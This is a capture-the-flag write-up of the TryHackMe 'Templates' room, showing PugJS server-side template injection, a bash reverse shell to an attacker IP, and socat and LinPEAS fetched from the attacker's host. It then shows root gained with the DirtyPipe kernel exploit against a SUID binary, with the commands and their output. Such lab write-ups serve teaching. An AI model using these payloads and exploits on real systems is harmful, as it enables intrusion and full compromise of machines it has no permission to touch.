# Templates

## Introduction

Welcome to my another writeup! In this TryHackMe [Templates](https://tryhackme.com/room/templates) room, you'll learn: Server-Side Template Injection (SSTI) in PugJS template engine and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

> Pug is my favorite templating engine! I made this super slick application so you can play around with Pug and see how it works.

> Difficulty: Medium

My favourite type of dog is a pug... and, you know what, Pug is my favourite templating engine too! I made this super slick application so you can play around with Pug and see how it works. Seriously, you can do so much with Pug!

Access this challenge by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [HTTP://MACHINE_IP:5000](HTTP://MACHINE_IP:5000)

Check out similar content on TryHackMe:

[SSTI](https://tryhackme.com/room/learnssti)

## Service Enumeration

### HTTP on Port 5000

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103054546.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103054809.png)

**In here, we're able to generate a PugJS template, then the `Convert to HTML` button will convert our template into HTML format!**

**PugJS template engine:**

- [https://pugjs.org/api/getting-started.html](https://pugjs.org/api/getting-started.html)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103054930.png)

**We can try some payload to test is it vulnerable to Server-Side Template Injection (SSTI)!**

**According to [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs), we can try this payload:**
```js
#{7*7}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103055200.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103055210.png)

It's indeed vulnerable to SSTI!

## Initial Foothold

**Now, we can try to get a shell on the target machine.**

**To do so, I'll use the payload from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs) again:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103055616.png)

- Setup a `nc` listener:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# nc -lnvp 443
listening on [any] 443 ...
```

- Create a Bash reverse shell payload: (Generated from [revshells.com](https://www.revshells.com/))

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# nano revshell.sh

┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# cat revshell.sh
/bin/bash -i >& /dev/tcp/10.9.0.253/443 0>&1

┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# chmod +x revshell.sh
```

- Host the reverse shell Bash script:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

- Send the payload from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs):

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103055833.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Templates/images/Pasted%20image%2020221103055900.png)

Now, we should have a shell on the target machine!

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# nc -lnvp 443       
listening on [any] 443 ...
connect to [10.9.0.253] from (UNKNOWN) [10.10.15.9] 49048
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
user@774c7a0d6226:/usr/src/app$ whoami;hostname;id;ip a
whoami;hostname;id;ip a
user
774c7a0d6226
uid=1001(user) gid=1001(user) groups=1001(user)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

**flag.txt:**
```
user@774c7a0d6226:/usr/src/app$ cat /usr/src/app/flag.txt
flag{Redacted}
```

## Privilege Escalation (Optional)

**Stable shell via `socat`:**
```
┌──(root🌸siunam)-[/opt/static-binaries/binaries/linux/x86_64]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

user@774c7a0d6226:/usr/src/app$ wget http://10.9.0.253/socat -O /tmp/socat;chmod +x /tmp/socat;/tmp/socat TCP:10.9.0.253:4444 EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane

┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:4444
2022/11/03 06:02:14 socat[16747] N opening character device "/dev/pts/2" for reading and writing
2022/11/03 06:02:14 socat[16747] N listening on AF=2 0.0.0.0:4444
                                                                 2022/11/03 06:02:23 socat[16747] N accepting connection from AF=2 10.10.15.9:56144 on AF=2 10.9.0.253:4444
                                                                2022/11/03 06:02:23 socat[16747] N starting data transfer loop with FDs [5,5] and [7,7]
                                            user@774c7a0d6226:/usr/src/app$ 
user@774c7a0d6226:/usr/src/app$ stty rows 23 columns 107
user@774c7a0d6226:/usr/src/app$ export TERM=xterm-256color
user@774c7a0d6226:/usr/src/app$ ^C
user@774c7a0d6226:/usr/src/app$ 
```

**I tried to find all the low hanging fruits except kernel exploit, like SUID sticky bit binaries, sudo permission, etc. But still no dice. So I'll run [LinPEAS](https://github.com/carlospolop/PEASS-ng) to find anything worth wild.**

**LinPEAS:**
```
┌──(root🌸siunam)-[/opt/PEAS]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

user@774c7a0d6226:/usr/src/app$ curl -s http://10.9.0.253/linpeas.sh | bash
[...]
╔══════════╣ CVEs Check
Vulnerable to CVE-2021-3560

Vulnerable to CVE-2022-0847
[...]
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c
[...]
```

**Hmm... Let's try the DirtyPipe kernel exploit.**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# wget https://haxx.in/files/dirtypipez.c
```

**Check the target machine has `gcc` installed or not:**
```
user@774c7a0d6226:/tmp$ which gcc
/usr/bin/gcc
```

It has `gcc` installed!

**Let's transfer the exploit to there and compile it!**
```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Templates]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

user@774c7a0d6226:/usr/src/app$ wget http://10.9.0.253/dirtypipez.c -O /tmp/dirtypipez.c;cd /tmp

user@774c7a0d6226:/tmp$ gcc dirtypipez.c -o dirtypipez  
user@774c7a0d6226:/tmp$ ./dirtypipez 
Usage: ./dirtypipez SUID
```

**This exploit require a SUID sticky bit binary! Let's use `find` to find all SUID binaries!**
```
user@774c7a0d6226:/tmp$ find / -perm -4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/bin/umount
/bin/su
/bin/ping
/bin/mount
```

**I'll use `/usr/bin/chfn` as an example:**
```
user@774c7a0d6226:/tmp$ ./dirtypipez /usr/bin/chfn
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))
# whoami;hostname;id;ip a
root
774c7a0d6226
uid=0(root) gid=0(root) groups=0(root)
[...]
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
# 
```

I'm root! :D

# Conclusion

What we've learned:

1. Server-Side Template Injection (SSTI) in PugJS Template Enigne
2. Privilege Escalation via DirtyPipe (CVE-2022-0847) Kernel Exploit